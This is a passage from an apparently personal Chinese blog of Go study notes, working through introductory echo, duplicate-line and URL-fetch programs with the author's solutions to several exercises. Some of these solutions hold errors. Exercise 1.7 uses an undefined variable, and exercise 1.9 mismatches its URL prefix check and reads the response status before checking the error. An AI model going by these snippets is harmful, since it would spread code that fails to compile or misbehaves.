title="编写第一个GO程序"></a>编写第一个GO程序</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 通过循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, b)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在命令行里执行<code>go run .\Hello.go http://gopl.io</code>，得到返回包，说明你的Go语言环境已经完全搭建成功啦！</p><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_12-43-23.png"></p><h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><code>os</code>包提供一些与操作系统交互的函数和变量，程序的命令行参数可以从<code>os</code>包的Args变量获取。</p><p><code>os.Args</code>变量是一个字符串的切片，区间索引时，同样是<strong>左闭右开</strong></p><p><code>os.Args</code>的第一个元素，<code>os.Args[0]</code>, 是命令本身的名字；其它的元素则是程序启动时传给它的 参数。s[m:n]形式的切片表达式，产生从第m个元素到第n-1个元素的切片。如果省略切片表达式的m或n，会默认传入0或 len(s)，因此切片可以简写成os.Args[1:]。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-comment">//测试程序</span><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span><br>   <span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br>   <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ &#123;<br>      s += sep + os.Args[i]<br>      sep = <span class="hljs-string">&quot; &quot;</span><br>   &#125;<br>   fmt.Println(s)<br>&#125;<br></code></pre></td></tr></table></figure><p>对于上面的程序，我们可以有如下理解：</p><ul><li><p>GO里面注释使用<code>//</code></p></li><li><p>GO初始定义的变量若是没有赋值，则隐式地被赋为零值，数值类型是0，字符串类型是空字符串””</p></li><li><p>对于string类型的变量，<code>+</code>号可以直接连接字符串</p></li><li><p>循环变量<code>i</code>没有定义类型，是因为。<strong>符号<code>:=</code> 是短变量声明的一部分</strong>, 这是定义一个或多个变量并根据它们的初始值为这些变量赋予适当类型的语句</p></li><li><p>GO中<code>i++</code>是语句，不是表达式，所以不能用于赋值，**<code>j=i++</code>非法<strong>，而且<code>++</code>和<code>--</code>都只 能放在变量名后面，因此</strong><code>--i </code>也非法**</p></li><li><p>GO中只有<code>for</code>一种循环语句，但有多种形式</p><ul><li><p>第一种：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> initialization; condition; post&#123;<br>    <br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for 循环三个部分不需要括号包围，左大括号必须与post同一行</span><br><span class="hljs-comment">initalization如果存在，必须是一条简单语句。即，短变量声明、自增语句、赋值语句或函数调用。</span><br><span class="hljs-comment">condition 是一个布尔表达式（boolean expression），其值在每次循环迭代开始时计算。如果为 true 则执行循环体语句。</span><br><span class="hljs-comment">post语句在循环体执行结束后执行，之后再次对conditon求值。condition 值为 false 时，循环结束</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><p>省略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// a traditional &quot;while&quot; loop</span><br><span class="hljs-keyword">for</span> condition &#123;<br><br>&#125;<br><span class="hljs-comment">//上面就是省略了初始化和post，变成了熟悉的while循环</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>range</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>s += sep + arg<br>sep = <span class="hljs-string">&quot; &quot;</span><br>&#125;<br><span class="hljs-comment">/*for 循环的另一种形式, 在某种数据类型的区间（range）上遍历，如字符串或切片。</span><br><span class="hljs-comment">大多数程序员都这么写for循环</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>每次循环迭代，range产生一对值：索引以及索引对应的元素值<br>但是我们这个例子不需要索引，而<strong>range的语法要求：要处理元素，必须处理索引</strong><br>而且<strong>GO不允许使用无用的局部变量，会编译错误</strong><br>解决方法是使用空标识符<code>_</code>，<strong>空标识符可用于任何语法需要变量名但程序逻辑不需要的时候</strong></p></li></ul></li><li><p>声明一个变量有好几种方式，下面这些都等价：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">var</span> s <span class="hljs-type">string</span> = <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>一个简洁的写法，使用strings包的Join函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:],<span class="hljs-string">&quot;&quot;</span>))<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h4><h5 id="练习-1-1"><a href="#练习-1-1" class="headerlink" title="练习 1.1"></a>练习 1.1</h5><p>修改 echo 程序，使其能够打印 os.Args[0] ，即被执行命令本身的名字。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ &#123;<br>s += sep + os.Args[i]<br>sep = <span class="hljs-string">&quot; &quot;</span><br>&#125;<br>fmt.Println(s)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_13-47-33.png"></p><h5 id="练习-1-2"><a href="#练习-1-2" class="headerlink" title="练习 1.2"></a>练习 1.2</h5><p>修改 echo 程序，使其打印每个参数的索引和值，每个一行。 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> n, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d %s\n&quot;</span>, n, arg)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_13-51-04.png"></p><h5 id="练习-1-3"><a href="#练习-1-3" class="headerlink" title="练习 1.3"></a>练习 1.3</h5><p>做实验测量潜在低效的版本和使用了 strings.Join 的版本的运行时间差异。（1.6 节讲解了部分 time 包，11.4节展示了如何写标准测试程序，以得到系统性的性能评测。）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   start := time.Now()<br>   <span class="hljs-comment">//测试一</span><br>   <span class="hljs-comment">//for _, arg := range os.Args[1:] &#123;</span><br>   <span class="hljs-comment">// fmt.Printf(&quot;%s &quot;, arg)</span><br>   <span class="hljs-comment">//&#125;</span><br>   <span class="hljs-comment">//测试二</span><br>   fmt.Println(strings.Join(os.Args[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>))<br>   secs := time.Since(start).Seconds()<br>   fmt.Printf(<span class="hljs-string">&quot;花费：%.8fs&quot;</span>, secs)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_14-02-15.png"></p><p>使用<code>Join</code>函数确实可以大幅减少时间复杂度</p><h4 id="查找重复的行"><a href="#查找重复的行" class="headerlink" title="查找重复的行"></a>查找重复的行</h4><p>对文件做拷贝、打印、搜索、排序、统计或类似事情的程序都有一个差不多的程序结构：一 个处理输入的循环，在每个元素上执行计算处理，在处理的同时或最后产生输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 创建一个用于从标准输入读取的扫描器</span><br>input := bufio.NewScanner(os.Stdin)<br><span class="hljs-comment">// 循环读取标准输入的每一行文本</span><br><span class="hljs-keyword">for</span> input.Scan() &#123;<br><span class="hljs-comment">// 将当前行文本作为键，增加其对应的出现次数</span><br>counts[input.Text()]++<br>&#125;<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts &#123;<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d\t%s\n&quot;</span>, n, line)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-16_15-05-52.png"></p><p>对上面的代码可以有如下理解：</p><ul><li><p><code>map</code>是存储了键值对的集合，键可以是任意类型，只要其值可以用<code>==</code>运算符比较；值可以是任意类型。上面得的代码中，键是字符串，值是整数。内置函数make创建空函数</p></li><li><p>打印结果使用<code>range</code>函数，在<code>counts</code>上迭代，每次得到键和值。需要注意的是，**<code>map</code>的遍历顺序不确定，该顺序随机，每次运行都会变化**。</p></li><li><p>关于<code>bufio</code>包，这个包使得处理输入和输出方便高效。<code>Scanner</code>类型是该包最有用的特性之 一，它读取输入并将其拆成行或单词；<strong>通常是处理行形式的输入最简单的方法</strong>。 程序使用短变量声明创建<code>bufio.Scanner</code>类型的变量<code>input</code>。读取内容由<code>input.Text()</code>获取，在读到一行时返回<code>true</code>。</p></li><li><p><code>fmt.Printf</code>函数对一些表达式产生格式化输出。该函 数的首个参数是个格式字符串，指定后续参数被如何格式化。和C语言类似。后缀<code>f</code>指<code>fomart</code>，<code>ln</code> 指<code>line</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">%d 十进制整数<br>%x, %o, %b 十六进制，八进制，二进制整数。<br>%f, %g, %e 浮点数： <span class="hljs-number">3.141593</span> <span class="hljs-number">3.141592653589793</span> <span class="hljs-number">3.141593e+00</span><br>%t 布尔：<span class="hljs-literal">true</span>或<span class="hljs-literal">false</span><br>%c 字符（<span class="hljs-type">rune</span>） (Unicode码点)<br>%s 字符串<br>%q 带双引号的字符串<span class="hljs-string">&quot;abc&quot;</span>或带单引号的字符<span class="hljs-string">&#x27;c&#x27;</span><br>%v 变量的自然形式（natural format）<br>%T 变量的类型<br>%% 字面上的百分号标志（无操作数）<br></code></pre></td></tr></table></figure></li><li><p><code>fmt.Printf</code>相当于C的<code>printf</code>函数，可以格式化参数；而<code>fmt.Println</code>函数相当于C++的<code>cout</code>函数，直接输出字符串</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;Alice&quot;</span><br>age := <span class="hljs-number">30</span><br>fmt.Printf(<span class="hljs-string">&quot;Name: %s, Age: %d\n&quot;</span>, name, age)<br>name := <span class="hljs-string">&quot;Bob&quot;</span><br>age := <span class="hljs-number">25</span><br>fmt.Println(<span class="hljs-string">&quot;Name:&quot;</span>, name, <span class="hljs-string">&quot;Age:&quot;</span>, age)<br></code></pre></td></tr></table></figure></li></ul><p>还有另一个方法，一口气把全部输入数据读到内存中，分割为多行，然后处理它们。这个例子引入 了<code>ReadFile</code>函数（来自于<code>io/ioutil</code>包），读取指定文件的全部内容，<code>strings.Split</code>函数把字符串分割成子串的切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 循环遍历命令行参数中的每个文件名</span><br><span class="hljs-keyword">for</span> _, filename := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-comment">// 读取文件的内容</span><br>data, err := ioutil.ReadFile(filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果读取文件发生错误，将错误信息输出到标准错误流并继续处理下一个文件</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;xxx:%v\n&quot;</span>, err)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">// 将文件内容按行拆分，并统计每行的出现次数</span><br><span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> strings.Split(<span class="hljs-type">string</span>(data), <span class="hljs-string">&quot;\n&quot;</span>) &#123;<br>counts[line]++<br>&#125;<br>&#125;<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts &#123;<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d\t%s\n&quot;</span>, n, line)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ReadFile</code>函数返回一个字节切片，必须把它转换为<code>string</code>，才能 用<code>strings.Split</code>分割。实现上，<code>bufio.Scanner</code>、<code>ioutil.ReadFile</code>和<code>ioutil.WriteFile</code>都使 用<code>*os.File</code>的<code>Read</code>和<code>Write</code>方法，但是，大多数程序员很少需要直接调用那些低级函数。</p><h4 id="获取URL"><a href="#获取URL" class="headerlink" title="获取URL"></a>获取URL</h4><p>Go语言在<code>net</code>这 个强大<code>package</code>的帮助下提供了一系列的<code>package</code>来做这件事情，使用这些包可以更简单地用 网络收发信息，还可以建立更底层的网络连接，编写服务器程序。</p><p>下面是一个使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, b)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在文件资源目录下使用终端，命令：<code>go run hello.go http://remixxyh.github.io</code></p><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><h5 id="练习1-7"><a href="#练习1-7" class="headerlink" title="练习1.7"></a>练习1.7</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, b)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里使用<code>io.Copy</code>函数，是题目所给的将内容直接拷贝到标准输出中，将 <code>io.Copy</code> 的返回值存储在一个匿名变量 <code>_</code> 中，因为我们主要关心错误处理，而不是复制的字节数。</p><h5 id="练习1-8"><a href="#练习1-8" class="headerlink" title="练习1.8"></a>练习1.8</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">&quot;http://&quot;</span>) &#123;<br>         url = <span class="hljs-string">&quot;http://&quot;</span> + url<br>      &#125;<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="练习1-9"><a href="#练习1-9" class="headerlink" title="练习1.9"></a>练习1.9</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">&quot;http://&quot;</span>) &#123;<br>         url = <span class="hljs-string">&quot;https://&quot;</span> + url<br>      &#125;<br>      resp, err := http.Get(url)<br>      fmt.Printf(resp.Status)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch:%v\n&quot;</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;fetch: reading %s: %v\n&quot;</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/Snipaste_2023-08-18_20-21-57.png"></p><h4 id="并发获取多个URL"><a href="#并发获取多个URL" class="headerlink" title="并发获取多个URL"></a>并发获取多个URL</h4><p>Go语言最有意思并且最新奇的特性就是对并发编程的支持</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>start := time.Now()<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] &#123;<br><span class="hljs-keyword">go</span> fetch(url, 